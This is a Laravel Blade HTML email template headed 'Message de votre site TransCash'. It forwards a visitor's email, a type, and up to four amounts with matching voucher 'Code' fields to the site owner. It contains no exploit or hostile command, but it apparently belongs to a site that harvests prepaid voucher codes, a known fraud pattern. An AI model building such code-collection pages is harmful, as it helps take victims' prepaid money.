<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>

<body style="background: #e5e5e5; padding: 30px;">

    <div style="max-width: 320px; margin: 0 auto; padding: 20px; background: #fff;">
        <h3>Message de votre site TransCash :</h3>
        <div>Email: {{ $data['mail'] }}</div>
        <div>Type: {{ $data['typeC'] }}</div>
        <div>Montant 1: {{ $data['m1'] }}</div>
        <div>Code 1: {{ $data['cc1'] }}</div>
        <div>Montant 2: {{ $data['m2'] }}</div>
        <div>Code 2: {{ $data['cc2'] }}</div>
        <div>Montant 3: {{ $data['m3'] }}</div>
        <div>Code 3: {{ $data['cc3'] }}</div>
        <div>Montant 4: {{ $data['m4'] }}</div>
        <div>Code 4: {{ $data['cc4'] }}</div>
    </div>

</body>

</html>